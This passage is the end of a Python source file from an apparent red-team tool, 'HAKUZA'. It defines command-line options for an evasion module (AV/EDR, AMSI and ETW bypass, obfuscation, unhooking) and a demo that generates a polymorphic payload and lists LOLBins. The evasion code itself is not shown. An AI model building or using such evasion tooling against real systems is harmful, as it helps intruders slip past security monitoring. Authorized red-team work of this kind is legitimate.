        detected = EDREvasion.detect_edr()
        for edr in detected[:3]:
            console.print(f"  • {edr}")
        console.print()


def register_evasion_argparse(subparsers) -> None:
    """Register evasion module CLI arguments."""
    p_evasion = subparsers.add_parser(
        "evasion",
        help="Red team evasion: AV/EDR bypass, payload obfuscation, behavioral evasion",
        description="Comprehensive evasion techniques for authorized red team operations"
    )

    p_evasion.add_argument(
        "--action",
        choices=["list", "generate", "test", "av", "edr"],
        default="list",
        help="Evasion action to perform"
    )

    p_evasion.add_argument(
        "--payload-type",
        choices=["powershell", "obfuscated", "csharp", "dotnet"],
        default="powershell",
        help="Type of payload to generate"
    )

    p_evasion.add_argument(
        "--av", action="store_true",
        help="Enable AV evasion techniques"
    )

    p_evasion.add_argument(
        "--edr", action="store_true",
        help="Enable EDR evasion techniques"
    )

    p_evasion.add_argument(
        "--amsi", action="store_true",
        help="Enable AMSI bypass techniques"
    )

    p_evasion.add_argument(
        "--etw", action="store_true",
        help="Enable ETW bypass techniques"
    )

    p_evasion.add_argument(
        "--obfuscate", action="store_true",
        help="Enable payload obfuscation"
    )

    p_evasion.add_argument(
        "--unhook", action="store_true",
        help="Enable unhooking techniques"
    )

    p_evasion.set_defaults(func=cmd_red_evasion)


if __name__ == "__main__":
    # Example usage
    print("HAKUZA Red Team Evasion Module")
    print("=" * 50)

    # Test obfuscation
    obf = PayloadObfuscation()
    payload = b"Test payload content"
    encrypted, decoder, key = obf.polymorph_payload(payload)
    print(f"\nPolymorphic Payload Generated")
    print(f"Encrypted size: {len(encrypted)} bytes")
    print(f"Key size: {len(key)} bytes")

    # Test detection
    simulator = DetectionSimulator()
    score = simulator.calculate_evasion_effectiveness(["unhooking", "behavioral_evasion"])
    print(f"\nEvasion Score: {score:.2%}")

    # Test LOLBins
    print(f"\nAvailable LOLBins: {len(AVEvasion.LOLBINS)}")
    for name in list(AVEvasion.LOLBINS.keys())[:3]:
        print(f"  • {name}")
